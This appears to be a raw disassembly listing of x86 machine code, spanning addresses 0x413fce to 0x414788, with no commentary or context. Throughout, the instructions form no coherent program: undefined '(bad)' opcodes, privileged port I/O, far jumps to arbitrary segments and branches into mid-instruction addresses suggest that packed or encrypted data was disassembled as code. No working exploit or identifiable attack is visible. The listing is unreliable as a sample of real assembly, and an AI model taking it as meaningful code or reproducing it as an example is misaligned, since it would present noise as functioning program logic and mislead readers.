  413fce:	xchg   ebx,eax
  413fcf:	mov    ecx,0xe2e505fd
  413fd4:	pop    eax
  413fd5:	inc    ecx
  413fd6:	cmp    ebp,DWORD PTR [eax+0x3dc11542]
  413fdc:	pop    ss
  413fdd:	icebp  
  413fde:	jle    0x414010
  413fe0:	jp     0x413fd5
  413fe2:	cmp    ebp,ebx
  413fe4:	cwde   
  413fe5:	jmp    0x6b36:0x2ce7ca2
  413fec:	arpl   WORD PTR [ebp-0x17],dx
  413fef:	mov    edi,0xd3a82e2f
  413ff4:	shl    DWORD PTR [edi+0x5ad9ce89],0x17
  413ffb:	sub    bh,dh
  413ffd:	fisttp QWORD PTR [edx]
  413fff:	sbb    BYTE PTR [eax+0x66],ah
  414002:	inc    ecx
  414003:	cwde   
  414004:	xchg   DWORD PTR [ebx+ecx*1-0x5d],ecx
  414008:	sbb    esp,ecx
  41400a:	imul   ebp
  41400c:	loope  0x41404e
  41400e:	int3   
  41400f:	and    DWORD PTR [ecx],ebx
  414011:	inc    eax
  414012:	pop    esp
  414013:	mov    ebp,0xa44c03ab
  414018:	loopne 0x414015
  41401a:	pop    eax
  41401b:	mov    ah,0x6c
  41401d:	nop
  41401e:	add    ecx,ebp
  414020:	inc    edx
  414021:	mov    BYTE PTR [eax+0x22],dl
  414024:	js     0x414004
  414026:	inc    ebx
  414027:	pushf  
  414028:	xor    BYTE PTR [edi],dh
  41402a:	mov    bl,0x44
  41402c:	repnz test BYTE PTR [ecx+0x68e1edea],bl
  414033:	sar    BYTE PTR [ebx+0xe],1
  414036:	mov    edi,DWORD PTR [eiz*4-0x2dbd9c8c]
  41403d:	push   edx
  41403e:	sub    eax,0x3e03a37c
  414043:	xor    eax,0x38118616
  414048:	rol    ah,1
  41404a:	sti    
  41404b:	push   ecx
  41404c:	dec    BYTE PTR [esi+0xac0ebc7]
  414052:	push   ecx
  414053:	xchg   DWORD PTR cs:[edi-0x5d90ba5e],esi
  41405a:	(bad)  
  41405b:	in     eax,0xb6
  41405d:	xchg   esp,eax
  41405e:	xchg   ebp,eax
  41405f:	xor    ch,BYTE PTR [edx+0x68e9e4eb]
  414065:	shl    BYTE PTR [edx+0x46],1
  414068:	ja     0x414010
  41406a:	add    DWORD PTR [esp+edx*8-0x776670b3],0x9a329286
  414075:	jl     0x4140a5
  414077:	mov    ebp,0x18ff5e97
  41407c:	jg     0x4140bb
  41407e:	xchg   ebp,eax
  41407f:	popf   
  414080:	lock add eax,DWORD PTR [edi]
  414083:	xlat   BYTE PTR ds:[ebx]
  414084:	cmp    bh,BYTE PTR [ebx]
  414086:	jle    0x41401b
  414088:	or     dl,bh
  41408a:	add    esi,DWORD PTR [edx-0x69]
  41408d:	jo     0x414074
  41408f:	mov    dl,dl
  414091:	fist   DWORD PTR [ecx]
  414093:	mov    ebx,ds
  414095:	mov    ds:0x2d1c4c89,al
  41409a:	(bad)  
  41409b:	push   cs
  41409c:	mov    BYTE PTR [esi],0x35
  41409f:	xchg   ebx,eax
  4140a0:	in     al,0xbe
  4140a2:	repnz cmc 
  4140a4:	mov    ah,0x58
  4140a6:	mov    ecx,0x4a8090cc
  4140ab:	push   edi
  4140ac:	mov    eax,0x6d7182e0
  4140b1:	fld    QWORD PTR [eax+0x113fc4a1]
  4140b7:	leave  
  4140b8:	inc    edx
  4140b9:	jmp    0x4140e2
  4140bb:	dec    DWORD PTR [ecx+0x6a]
  4140be:	xchg   edx,eax
  4140bf:	xchg   esp,eax
  4140c0:	push   esp
  4140c1:	fiadd  DWORD PTR [edi-0x80]
  4140c4:	sbb    DWORD PTR [esi],eax
  4140c6:	push   esi
  4140c7:	stos   BYTE PTR es:[edi],al
  4140c8:	je     0x414059
  4140ca:	adc    esi,DWORD PTR [ebx+0x49702372]
  4140d0:	and    ah,BYTE PTR [ebx-0x3ac73892]
  4140d6:	push   cs
  4140d7:	lea    esp,fs:[esi+0x75a62c3d]
  4140de:	dec    eax
  4140df:	(bad)  
  4140e0:	std    
  4140e1:	mov    ch,0x84
  4140e3:	cld    
  4140e4:	ret    
  4140e5:	sbb    ebx,edx
  4140e7:	lock xchg bx,ax
  4140ea:	jae    0x41412d
  4140ec:	sub    dl,BYTE PTR [ecx-0x2ce074f4]
  4140f2:	(bad)  [ebp+0x2f]
  4140f5:	add    al,0xd9
  4140f7:	push   edi
  4140f8:	outs   dx,BYTE PTR ds:[si]
  4140fa:	push   ebx
  4140fb:	loopne 0x414138
  4140fd:	xor    al,ah
  4140ff:	pusha  
  414100:	dec    ecx
  414101:	test   eax,0x91ca4e6b
  414106:	repz push es
  414108:	sbb    eax,0x5c4555ec
  41410d:	mov    al,ds:0x2c4f0c55
  414112:	fstp   TBYTE PTR [ecx]
  414114:	imul   edx,DWORD PTR [edi+0x2d7c81c7],0x92056225
  41411e:	mov    BYTE PTR [ebx+0x7c],0xc0
  414122:	hlt    
  414123:	rcr    BYTE PTR [edi+0x26ccb592],cl
  414129:	shl    cl,0x99
  41412c:	jg     0x4140e1
  41412e:	add    esi,edx
  414130:	dec    esi
  414131:	inc    ebx
  414132:	xchg   DWORD PTR [esp+ecx*4-0x6f],ecx
  414136:	stos   DWORD PTR es:[edi],eax
  414137:	call   0x3ac9:0x598f0ecc
  41413e:	and    eax,0x7c1c9a33
  414143:	(bad)  
  414144:	pusha  
  414145:	push   ecx
  414146:	inc    esi
  414147:	push   esp
  414148:	jl     0x4140ce
  41414a:	xchg   edx,eax
  41414b:	xor    al,0x9b
  41414d:	daa    
  41414e:	outs   dx,DWORD PTR ds:[esi]
  41414f:	aaa    
  414150:	xchg   edx,eax
  414151:	repnz rep lods al,BYTE PTR ds:[esi]
  414154:	sub    bl,BYTE PTR [edi+ebp*2-0x4794240b]
  41415b:	imul   ebp,DWORD PTR [edi-0x6f],0x2ee3f85c
  414162:	dec    edx
  414163:	push   edi
  414164:	in     al,dx
  414165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414166:	rcl    DWORD PTR [ebx],1
  414168:	stos   BYTE PTR es:[edi],al
  414169:	stc    
  41416a:	cmc    
  41416b:	sub    eax,DWORD PTR [ebx-0x3]
  41416e:	stos   DWORD PTR es:[edi],eax
  41416f:	lds    esi,FWORD PTR [eax-0x15]
  414172:	outs   dx,BYTE PTR ds:[esi]
  414173:	sub    dh,BYTE PTR [eax-0x3d]
  414176:	aaa    
  414177:	mov    ebx,0x185e9e1c
  41417c:	fs imul edx,esp,0xffffffa2
  414180:	pop    esi
  414181:	fdivr  DWORD PTR [eax+0x73]
  414184:	mov    esi,DWORD PTR ds:0x4c916dab
  41418a:	push   es
  41418b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41418c:	push   esi
  41418d:	fnstcw WORD PTR gs:[eax]
  414190:	popa   
  414191:	ficomp WORD PTR [ecx+ebx*8+0x74225635]
  414198:	dec    ecx
  414199:	ja     0x41419c
  41419b:	push   esi
  41419c:	das    
  41419d:	pusha  
  41419e:	imul   edi,esi,0x69
  4141a1:	mov    dl,0x80
  4141a3:	loop   0x4141eb
  4141a5:	push   edi
  4141a6:	rcl    eax,cl
  4141a8:	cmp    eax,0x768060d5
  4141ad:	cmp    eax,0x1de9f0b3
  4141b2:	loopne 0x41416e
  4141b4:	jne    0x4141b0
  4141b6:	jl     0x414188
  4141b8:	cmp    al,0xa5
  4141ba:	pop    esi
  4141bb:	dec    edi
  4141bc:	test   BYTE PTR [edi+0x4182905d],bl
  4141c2:	ins    DWORD PTR es:[edi],dx
  4141c3:	call   0xdf73:0x91b7bc24
  4141ca:	push   edi
  4141cb:	mov    eax,ds:0xd9a9f53e
  4141d0:	mov    eax,ds:0x562f3eb5
  4141d6:	xlat   BYTE PTR ds:[ebx]
  4141d7:	aad    0xae
  4141d9:	stc    
  4141da:	and    eax,0x30cc68f7
  4141df:	(bad)
  4141e3:	loope  0x414166
  4141e5:	jne    0x4141d3
  4141e7:	and    DWORD PTR [esi+ebx*4],eax
  4141ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141eb:	iret   
  4141ec:	test   BYTE PTR [edi+0x31],dl
  4141ef:	ret    
  4141f0:	loop   0x4141d1
  4141f2:	ror    BYTE PTR [esi],1
  4141f4:	push   ecx
  4141f5:	enter  0x2405,0xa1
  4141f9:	in     eax,dx
  4141fa:	imul   esi,DWORD PTR [edx+eiz*8+0x27d8c101],0x35
  414202:	adc    dh,BYTE PTR [ebp-0x31519650]
  414208:	or     ecx,DWORD PTR [edi-0x7aa7597]
  41420e:	xchg   ebp,eax
  41420f:	adc    edx,0xe3e93fb6
  414215:	int    0x19
  414217:	adc    BYTE PTR [ebp+0x2b],ah
  41421a:	je     0x4141f5
  41421c:	mov    eax,ds:0x4a0caddc
  414221:	cmp    bx,bp
  414224:	push   ecx
  414225:	cmp    al,0x51
  414227:	dec    ebx
  414228:	xchg   ebx,eax
  414229:	sub    al,0x7c
  41422b:	repnz mov eax,ds:0xf3f9587f
  414231:	and    DWORD PTR [ecx+0x527812f2],ecx
  414237:	ins    DWORD PTR es:[edi],dx
  414238:	cmp    al,0xa7
  41423a:	mov    ebx,0x9c5a06ff
  41423f:	pop    esi
  414240:	cli    
  414241:	inc    ebp
  414242:	test   DWORD PTR [ebp+0x305d727a],eax
  414248:	jecxz  0x4142ac
  41424a:	cmp    DWORD PTR [edx+0x6d3406f4],edx
  414250:	(bad)  
  414251:	xchg   edx,eax
  414252:	adc    dl,BYTE PTR [edi+0x4d]
  414255:	mov    al,ds:0x95eb1297
  41425a:	call   DWORD PTR [ebp+0x28bb0a5b]
  414260:	fwait
  414261:	popa   
  414262:	push   es
  414263:	xor    eax,DWORD PTR [ebx]
  414265:	int3   
  414266:	xor    al,0xce
  414268:	retf   0x4b28
  41426b:	or     DWORD PTR [ebx],ebp
  41426d:	sub    eax,0xc7698eaf
  414272:	and    DWORD PTR [esi+0x43a0bdbf],esp
  414278:	pusha  
  414279:	std    
  41427a:	cmp    eax,0xf16b001c
  41427f:	jae    0x41427b
  414281:	push   edx
  414282:	mov    bh,0xce
  414284:	and    BYTE PTR [ebx+0x5df5a5af],dl
  41428a:	retf   
  41428b:	ins    BYTE PTR es:[edi],dx
  41428c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41428d:	mul    DWORD PTR ds:0xad13f8e5
  414293:	fbstp  TBYTE PTR [esi+0x64c411b]
  414299:	cmp    dh,cl
  41429b:	imul   edi,DWORD PTR [ebx-0xbc0c6fe],0xffffffc2
  4142a2:	dec    eax
  4142a3:	pop    ebp
  4142a4:	mov    BYTE PTR [eax+0x7ea7699],ah
  4142aa:	xchg   esi,eax
  4142ab:	(bad)  [ecx]
  4142ad:	mov    eax,DWORD PTR [ebx]
  4142af:	xchg   edi,eax
  4142b0:	add    dl,dl
  4142b2:	xchg   BYTE PTR [eax],bl
  4142b4:	cs ds enter 0xe891,0xf1
  4142ba:	ja     0x414313
  4142bc:	cmp    al,0x4f
  4142be:	in     eax,dx
  4142bf:	out    0x3d,al
  4142c1:	pop    ebx
  4142c2:	mov    DWORD PTR [ebx-0x6df67725],ebx
  4142c8:	retf   
  4142c9:	gs aaa 
  4142cb:	aam    0xf4
  4142cd:	push   0xffffffb9
  4142cf:	xchg   edx,eax
  4142d0:	cmp    BYTE PTR [edi+esi*2+0x75147534],dl
  4142d7:	mov    cl,ch
  4142d9:	repnz loop 0x41433a
  4142dc:	out    0x66,al
  4142de:	mov    ds:0x31d37abf,al
  4142e3:	scas   eax,DWORD PTR es:[edi]
  4142e4:	xchg   ebp,eax
  4142e5:	pop    esi
  4142e6:	outs   dx,DWORD PTR ds:[esi]
  4142e7:	xor    DWORD PTR [ecx+0x3a],eax
  4142ea:	mov    eax,0xbcf0654a
  4142ef:	push   edx
  4142f0:	push   0x56c984b1
  4142f5:	mov    al,0x62
  4142f7:	adc    al,0x38
  4142f9:	xchg   ebp,eax
  4142fa:	les    esi,FWORD PTR [edi+0xe3f16a]
  414300:	adc    ebx,DWORD PTR [ebx+edi*1+0x4]
  414304:	popf   
  414305:	xchg   ah,bh
  414307:	dec    esp
  414308:	inc    eax
  414309:	dec    esp
  41430a:	or     ah,BYTE PTR [ecx]
  41430c:	pop    esi
  41430d:	pop    ds
  41430e:	pop    ds
  41430f:	jge    0x4142fe
  414311:	mov    ebx,0xaf9244ac
  414316:	xor    al,0x48
  414318:	xor    al,0x7c
  41431a:	aas    
  41431b:	adc    DWORD PTR [esp+edx*8],ebp
  41431e:	pop    ds
  41431f:	push   edx
  414320:	fcmovnbe st,st(2)
  414322:	mov    BYTE PTR [ebx+0x73ddccb7],bl
  414328:	push   esi
  414329:	aas    
  41432a:	xchg   edi,eax
  41432b:	xchg   ecx,eax
  41432c:	mov    DWORD PTR [eax-0x46bd465d],eax
  414332:	rol    BYTE PTR [edx-0x27],cl
  414335:	add    ah,0x6e
  414338:	cli    
  414339:	jbe    0x4142e3
  41433b:	or     eax,0x51041b27
  414340:	pop    ss
  414341:	mov    WORD PTR [ecx],?
  414343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414344:	jle    0x41434d
  414346:	scas   al,BYTE PTR es:[edi]
  414347:	inc    esi
  414348:	push   esi
  414349:	pop    ds
  41434a:	leave  
  41434b:	fwait
  41434c:	adc    DWORD PTR [ebx],edx
  41434e:	mov    ebp,0xf513b4ee
  414353:	add    al,0x6f
  414355:	add    al,0xe4
  414357:	mov    eax,0x32e8333c
  41435c:	hlt    
  41435d:	cld    
  41435e:	pushf  
  41435f:	sub    dl,cl
  414361:	hlt    
  414362:	loop   0x4143c9
  414364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414365:	jmp    0x7e4f:0x565594b6
  41436c:	push   ds
  41436d:	(bad)  
  41436e:	shl    dh,cl
  414370:	sub    DWORD PTR [eax-0x50d3a944],esp
  414376:	out    0xd9,al
  414378:	out    0x9c,eax
  41437a:	mov    ah,0xf0
  41437c:	fidivr DWORD PTR [eax+edx*1-0x61]
  414380:	mov    edx,edi
  414382:	(bad)  
  414383:	jmp    0xb09d:0xa71d0b4e
  41438a:	cmp    DWORD PTR ds:0x997e4f9e,esi
  414390:	rol    DWORD PTR [ebx+0x34],cl
  414393:	retf   
  414394:	pop    eax
  414395:	push   ecx
  414396:	push   edx
  414397:	shl    DWORD PTR [ecx],cl
  414399:	daa    
  41439a:	adc    DWORD PTR [ebx+0x2cda4485],esp
  4143a0:	xlat   BYTE PTR ds:[ebx]
  4143a1:	push   0x69
  4143a3:	adc    dl,bl
  4143a5:	scas   eax,DWORD PTR es:[edi]
  4143a6:	inc    edx
  4143a7:	inc    ebx
  4143a8:	xchg   esi,eax
  4143a9:	imul   BYTE PTR [ebp+0x16d34984]
  4143af:	sub    eax,0x4deb12e0
  4143b4:	pop    edi
  4143b5:	aad    0x13
  4143b7:	xchg   ecx,eax
  4143b8:	add    ah,BYTE PTR [edi+0x34]
  4143bb:	xlat   BYTE PTR ds:[ebx]
  4143bc:	nop
  4143bd:	call   0xbc6f7f74
  4143c2:	jp     0x414361
  4143c4:	sbb    BYTE PTR [ecx],cl
  4143c6:	jmp    0x3052fb9d
  4143cb:	pop    ds
  4143cc:	adc    BYTE PTR [edx-0x550fa1f0],ah
  4143d2:	xchg   edi,eax
  4143d3:	gs mov ebp,0x7bbbc6be
  4143d9:	loope  0x41440d
  4143db:	and    ebp,DWORD PTR [edx-0x20]
  4143de:	outs   dx,DWORD PTR ds:[esi]
  4143df:	sbb    BYTE PTR [ebp+0x8b59020],0x32
  4143e6:	cwde   
  4143e7:	sub    DWORD PTR [ebx+0x61008f4a],eax
  4143ed:	inc    edx
  4143ee:	pop    ds
  4143ef:	sbb    DWORD PTR [edi],edx
  4143f1:	enter  0x98c7,0xbf
  4143f5:	dec    esi
  4143f6:	ins    BYTE PTR es:[edi],dx
  4143f7:	mov    esp,0xd163db09
  4143fc:	pop    edx
  4143fd:	cmc    
  4143fe:	(bad)  
  4143ff:	fisttp QWORD PTR [esi-0x76]
  414402:	add    BYTE PTR [edi+0x7a],ah
  414405:	xor    BYTE PTR [eax+ecx*4+0x31bf0fe0],0xc6
  41440d:	and    bh,BYTE PTR [ebx]
  41440f:	sub    al,0x6
  414411:	jo     0x4143ad
  414413:	pop    edx
  414414:	jp     0x414459
  414416:	xchg   edi,eax
  414417:	dec    edx
  414418:	sbb    eax,0xd6ff7701
  41441d:	xor    eax,0x9e26caba
  414422:	dec    esi
  414423:	outs   dx,BYTE PTR ss:[esi]
  414425:	loopne 0x414456
  414427:	mov    DWORD PTR [edi+0x7d],esi
  41442a:	dec    edi
  41442b:	pushf  
  41442c:	and    DWORD PTR [ebx],ecx
  41442e:	cmc    
  41442f:	mov    al,ds:0xc4e1872c
  414434:	call   DWORD PTR [eax-0x5d8b7616]
  41443a:	ja     0x4143d2
  41443c:	jo     0x414440
  41443e:	sbb    DWORD PTR [ebp+0x11],ebx
  414441:	add    BYTE PTR [edi+ebp*2-0x358a0e16],cl
  414448:	and    al,0xd8
  41444a:	cmp    BYTE PTR [esi],dh
  41444c:	clc    
  41444d:	or     al,0xdf
  41444f:	jg     0x414434
  414451:	lods   eax,DWORD PTR ds:[esi]
  414452:	inc    ebp
  414453:	fdiv   st(6),st
  414455:	in     al,0xf7
  414457:	xchg   eax,esp
  414459:	mov    ebp,0x92c2379d
  41445e:	outs   dx,BYTE PTR ds:[esi]
  41445f:	in     al,0xa2
  414461:	sub    eax,0x295602a3
  414466:	cwde   
  414467:	iret   
  414468:	loop   0x4144d1
  41446a:	inc    ebp
  41446b:	out    dx,eax
  41446c:	push   edx
  41446d:	mov    ds:0x59be95a7,al
  414472:	inc    ecx
  414473:	xchg   ebp,eax
  414474:	mov    ?,edi
  414476:	and    BYTE PTR [ecx+esi*4+0x6f],0x48
  41447b:	lahf   
  41447c:	pop    ds
  41447d:	pushf  
  41447e:	jno    0x4144c6
  414480:	inc    eax
  414481:	sbb    DWORD PTR [edx],ebx
  414483:	xchg   esi,eax
  414484:	ss adc dh,bh
  414487:	cli    
  414488:	adc    eax,0xed6207a9
  41448d:	fwait
  41448e:	das    
  41448f:	imul   esi,edx,0xfffffff4
  414492:	lods   al,BYTE PTR ds:[esi]
  414493:	pop    esi
  414494:	xchg   DWORD PTR [eax+esi*2-0x59],edx
  414498:	inc    edi
  414499:	test   BYTE PTR [edi],bh
  41449b:	and    DWORD PTR [edi-0x1e],edi
  41449e:	jb     0x41450c
  4144a0:	pop    ds
  4144a1:	mov    esi,DWORD PTR [ebx+0x42ad7d6]
  4144a7:	ins    BYTE PTR es:[edi],dx
  4144a8:	jl     0x4144b4
  4144aa:	jl     0x414436
  4144ac:	xchg   esi,eax
  4144ad:	inc    ebx
  4144ae:	inc    edi
  4144af:	test   al,0xbc
  4144b1:	inc    ebx
  4144b2:	jle    0x414472
  4144b4:	sub    ecx,DWORD PTR [esi-0x60e431bf]
  4144ba:	xor    edx,DWORD PTR [ecx]
  4144bc:	jne    0x414456
  4144be:	seta   BYTE PTR [ebx]
  4144c1:	std    
  4144c2:	cmp    bl,al
  4144c4:	pop    esp
  4144c5:	add    al,0x89
  4144c7:	pop    edi
  4144c8:	adc    esp,DWORD PTR [edx+0xc]
  4144cb:	fcomi  st,st(5)
  4144cd:	pop    ebx
  4144ce:	add    eax,0x4940824c
  4144d3:	(bad)  
  4144d4:	cmp    edi,esi
  4144d6:	lods   eax,DWORD PTR ds:[esi]
  4144d7:	sub    BYTE PTR [edi-0x19],cl
  4144da:	test   al,0x4a
  4144dc:	adc    al,0xe3
  4144de:	shl    DWORD PTR [ecx],cl
  4144e0:	mov    al,0x3d
  4144e2:	sub    DWORD PTR [edx+0x71],edx
  4144e5:	jecxz  0x4144ba
  4144e7:	and    eax,0xceffcf0b
  4144ec:	xor    eax,esi
  4144ee:	and    ebx,edx
  4144f0:	mov    esp,0xa2902ee3
  4144f5:	rol    al,1
  4144f7:	dec    edx
  4144f8:	(bad)  
  4144f9:	les    eax,FWORD PTR [edi-0x26]
  4144fc:	mov    ah,0x11
  4144fe:	out    dx,eax
  4144ff:	pop    edi
  414500:	xchg   edx,eax
  414501:	push   ss
  414502:	dec    edx
  414503:	ret    
  414504:	cmp    dh,bl
  414506:	pop    ss
  414507:	into   
  414508:	fdivp  st(4),st
  41450a:	mov    ecx,0xd3cbe1af
  41450f:	out    0xb4,eax
  414511:	add    al,0x3f
  414513:	sub    eax,0xdd7ccc7b
  414518:	addps  xmm3,XMMWORD PTR [edx]
  41451b:	faddp  st(1),st
  41451d:	xlat   BYTE PTR ds:[ebx]
  41451e:	popf   
  41451f:	stos   DWORD PTR es:[edi],eax
  414520:	cmp    BYTE PTR [ebx],0x99
  414523:	dec    esi
  414524:	fwait
  414525:	test   al,0x61
  414527:	in     eax,dx
  414528:	inc    eax
  414529:	push   eax
  41452a:	neg    DWORD PTR [edi-0x9416f8f]
  414530:	cs pusha 
  414532:	test   al,0xdf
  414534:	aam    0xc1
  414536:	mov    edx,0xf987d37
  41453b:	pop    esi
  41453c:	sub    al,0x47
  41453e:	and    edi,DWORD PTR ds:0x15bd19ad
  414544:	cmp    eax,DWORD PTR [edx+0x1378aca7]
  41454a:	icebp  
  41454b:	jp     0x41451f
  41454d:	cmp    DWORD PTR [esi+0x34b78538],esp
  414553:	sbb    DWORD PTR [ebx+ebx*2],ebp
  414556:	test   cl,cl
  414558:	sbb    BYTE PTR [eax+0x3253b673],bh
  41455e:	add    BYTE PTR [eiz*4-0x57851dea],dh
  414565:	test   BYTE PTR [ebx-0x42f4fd0a],bh
  41456b:	mov    dl,0xa5
  41456d:	dec    ecx
  41456e:	mov    al,BYTE PTR [esi*4+0x155a76c3]
  414575:	mov    edi,0xe790092e
  41457a:	pop    edx
  41457b:	aad    0x6f
  41457d:	pop    edi
  41457e:	push   edx
  41457f:	push   eax
  414580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414581:	adc    eax,0xaf767f73
  414586:	call   0x84da:0x9597e994
  41458d:	mov    ebx,0xe505323c
  414592:	adc    DWORD PTR [edx+0x66],ebx
  414595:	popf   
  414596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414598:	shl    BYTE PTR [edi-0x13],0xce
  41459c:	jne    0x414553
  41459e:	jmp    0xe53c:0x13791337
  4145a5:	lahf   
  4145a6:	push   es
  4145a7:	pop    edx
  4145a8:	xchg   ebx,eax
  4145a9:	mov    dh,0xfe
  4145ab:	sub    BYTE PTR [esi+0x6298b1ac],cl
  4145b1:	push   ebp
  4145b2:	adc    eax,0x6daee111
  4145b7:	(bad)
  4145ba:	ret    0x438
  4145bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145be:	xor    BYTE PTR [eax],bl
  4145c0:	dec    esi
  4145c1:	xchg   esi,eax
  4145c2:	das    
  4145c3:	adc    eax,0x64f7d951
  4145c8:	loope  0x414583
  4145ca:	inc    ebx
  4145cb:	or     edi,DWORD PTR [ecx-0x5fe53caf]
  4145d1:	jecxz  0x4145ca
  4145d3:	repz mov eax,0xb7997cf3
  4145d9:	or     BYTE PTR [ebp-0x6b],0xd1
  4145dd:	or     DWORD PTR [ecx-0x6ba302cc],0xffffffd0
  4145e4:	sbb    esi,DWORD PTR [edi+0x283be55b]
  4145ea:	sti    
  4145eb:	dec    eax
  4145ec:	jnp    0x4145ba
  4145ee:	rcl    edx,1
  4145f0:	rcr    BYTE PTR [edi],cl
  4145f2:	dec    ebx
  4145f3:	inc    esp
  4145f4:	idiv   DWORD PTR [ebx]
  4145f6:	sbb    edi,DWORD PTR [ebx-0x29]
  4145f9:	inc    edx
  4145fa:	mov    ah,0xc4
  4145fc:	adc    al,0x12
  4145fe:	ins    BYTE PTR es:[edi],dx
  4145ff:	pop    eax
  414600:	and    ecx,DWORD PTR [ebp+0x2b32d15d]
  414606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414607:	dec    edx
  414608:	pop    ss
  414609:	ins    BYTE PTR es:[edi],dx
  41460a:	mov    ecx,0xf3e0c825
  41460f:	push   ss
  414610:	jg     0x4145d1
  414612:	cdq    
  414613:	jne    0xe3094b10
  414619:	push   0xbc0426dc
  41461e:	hlt    
  41461f:	inc    edi
  414620:	jne    0x4145d9
  414622:	pushf  
  414623:	aas    
  414624:	push   esp
  414625:	aam    0xb1
  414627:	sbb    dh,ah
  414629:	cmp    al,0x10
  41462b:	in     al,0x52
  41462d:	adc    ebp,DWORD PTR [ecx+0x306fd5ba]
  414633:	imul   esp,ebp,0xc7f7f107
  414639:	cwde   
  41463a:	jbe    0x414661
  41463c:	mov    cl,0x8f
  41463e:	ins    BYTE PTR es:[edi],dx
  41463f:	mov    esi,0xfcac48ee
  414644:	xor    edi,DWORD PTR [ecx+esi*2]
  414647:	jge    0x41461f
  414649:	stc    
  41464a:	retf   
  41464b:	or     BYTE PTR [edx],ah
  41464d:	pop    esp
  41464e:	dec    eax
  41464f:	loope  0x414688
  414651:	cld    
  414652:	mov    ds:0xe2c0d317,al
  414657:	pop    ebp
  414658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414659:	adc    BYTE PTR [eax+0xd],bh
  41465c:	test   eax,0xccb297f9
  414661:	mov    edx,0xf1bda795
  414666:	rcr    BYTE PTR [ebp-0xb],cl
  414669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41466a:	mov    eax,ds:0xf819f35f
  41466f:	pop    ds
  414670:	repz jle 0x4146a2
  414673:	xor    al,0x19
  414675:	xor    DWORD PTR [ebx+edx*1-0x1ff156b4],edi
  41467c:	rcr    cl,cl
  41467e:	shr    DWORD PTR [eax+0x5a],cl
  414681:	pusha  
  414682:	fmul   QWORD PTR [edi-0x5c]
  414685:	imul   eax,ebp,0x5a8ff13c
  41468b:	dec    ebp
  41468c:	aad    0x2b
  41468e:	mov    bh,0x87
  414690:	jecxz  0x4146ea
  414692:	fs lahf 
  414694:	lea    edi,[edi-0x1d]
  414697:	retf   
  414698:	adc    ecx,ebp
  41469a:	into   
  41469b:	xchg   ebx,eax
  41469c:	push   ecx
  41469d:	adc    edx,edx
  41469f:	pop    esp
  4146a0:	jb     0x414704
  4146a2:	and    esp,DWORD PTR [edi+0x2a]
  4146a5:	inc    ecx
  4146a6:	jne    0x41462d
  4146a8:	mov    bl,bl
  4146aa:	push   ebx
  4146ab:	push   0x6aa145cf
  4146b0:	pop    es
  4146b1:	enter  0x6826,0xb3
  4146b5:	cdq    
  4146b6:	test   eax,0x9bd637b5
  4146bb:	outs   dx,DWORD PTR ds:[esi]
  4146bc:	fwait
  4146bd:	mov    ebp,0x8eea859
  4146c2:	push   esi
  4146c3:	bound  edx,QWORD PTR [edx]
  4146c5:	call   0xf22aa59a
  4146ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146cb:	xchg   DWORD PTR [ebp-0x71],ebp
  4146ce:	mov    ah,0x3
  4146d0:	ds xor al,0x4c
  4146d3:	int    0x69
  4146d5:	ins    BYTE PTR es:[edi],dx
  4146d6:	imul   eax,DWORD PTR [edi-0x64],0xffffff80
  4146da:	sub    BYTE PTR [ecx],ch
  4146dc:	call   0x95dd:0x2c5a332a
  4146e3:	xchg   esp,eax
  4146e4:	ins    BYTE PTR es:[edi],dx
  4146e5:	dec    edx
  4146e6:	rol    DWORD PTR [edx-0x71b477b],1
  4146ec:	nop
  4146ed:	adc    DWORD PTR [ebp+0xc],ebx
  4146f0:	xor    eax,DWORD PTR ds:0xc494557c
  4146f6:	push   ecx
  4146f7:	sbb    DWORD PTR [ebx-0x67],edi
  4146fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146fb:	mov    ebx,0xcbcad46a
  414700:	pushf  
  414701:	mov    edi,0x690701d3
  414706:	shl    BYTE PTR [ecx+ecx*1-0x37e94aa0],0x0
  41470e:	mov    ebp,0xf7899e9d
  414714:	push   esi
  414715:	loop   0x414721
  414717:	mov    edi,0x5cfd6b17
  41471c:	dec    ecx
  41471d:	in     al,0xcf
  41471f:	in     eax,0x72
  414721:	out    0x7,eax
  414723:	add    eax,0x2b047178
  414728:	sub    dh,BYTE PTR [edx+0x4b]
  41472b:	jmp    0xc2329b4a
  414730:	aaa    
  414731:	sbb    eax,0xb670a028
  414736:	stos   DWORD PTR es:[edi],eax
  414737:	(bad)  
  414738:	stc    
  414739:	mov    ch,0x65
  41473b:	out    dx,al
  41473c:	xchg   esi,eax
  41473d:	aaa    
  41473e:	pop    edi
  41473f:	xchg   esp,eax
  414740:	test   eax,0x56c1c7f7
  414745:	push   ecx
  414746:	idiv   BYTE PTR [ebx]
  414748:	lds    ebp,FWORD PTR [esi+0x362463d9]
  41474e:	xchg   dl,cl
  414750:	test   al,0xb6
  414752:	dec    edi
  414753:	int3   
  414754:	rol    DWORD PTR [edi-0x5cfa4050],0x5c
  41475b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41475c:	xchg   esi,eax
  41475d:	inc    esp
  41475e:	pop    es
  41475f:	sbb    bh,0x80
  414762:	jp     0x41471b
  414764:	cwde   
  414765:	pop    ebp
  414766:	les    ecx,FWORD PTR [esi+0x54]
  414769:	std    
  41476a:	xchg   ebp,eax
  41476b:	jp     0x41472e
  41476d:	(bad)  
  41476e:	push   DWORD PTR [eax+0x31dcdc62]
  414774:	out    dx,al
  414775:	push   cs
  414776:	xor    al,0x78
  414778:	outs   dx,BYTE PTR ds:[esi]
  414779:	in     eax,dx
  41477a:	sbb    esi,DWORD PTR [eax]
  41477c:	bound  ebp,QWORD PTR [ebp-0x4738df6e]
  414782:	fisub  WORD PTR [ebx-0x7f277901]
  414788:	test   eax,0xf4fa94c6
